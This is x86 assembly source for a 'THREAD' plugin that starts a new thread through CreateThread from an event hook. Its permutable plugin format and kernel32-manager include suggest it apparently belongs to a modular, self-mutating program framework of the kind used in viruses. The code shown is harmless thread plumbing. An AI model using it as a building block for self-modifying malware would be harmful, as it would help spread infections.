   ; THREAD
   ; ~~~~~~
   ; - new thread creator

   include                 INCLUDE\consts.inc
   include                 k32man.inc

   include                 plugin.inc
                           PLUGIN_START    THREAD, CODE32, PERMUTABLE

   handleevent:            hookevent EV_THREAD_NEW, run_newthread
                           stc
                           retn

   ; ECX=proc address to pass control to (in new thread);
   ; other registers (EDX/EBX/ESI/EDI) are passed into thread's proc

   ; proc at ECX will be called before EV_THREAD_NEW event returns, with
   ; the correctly set EBP

   run_newthread:          pusha

                           mov     esi, eax
                           mov     eax, esp

                           push    eax
                           push    esp
                           push    0
                           push    eax      ; thread parameter
                           pusho   newthread
                           push    64*1024  ; stack
                           push    0
                           callX   CreateThread
                           pop     eax

                           or      eax, eax        ; thread not created?
                           jz      __skipwait

   __wait:                 cmp     [esp].pusha_eax, esi
                           je      __wait
   __skipwait:

                           popa
                           clc
                           retn

   newthread:              pusha
                           mov     eax, [esp+32+4]
                           inc     [eax].pusha_eax         ; =thread working
                           mov     ecx, [eax].pusha_ecx    ; address
                           mov     edx, [eax].pusha_edx
                           mov     ebx, [eax].pusha_ebx
                           mov     esi, [eax].pusha_esi
                           mov     edi, [eax].pusha_edi
                           mov     ebp, [eax].pusha_ebp    ; EBP
                           call    ecx
                           popa
                           retn

                           PLUGIN_END
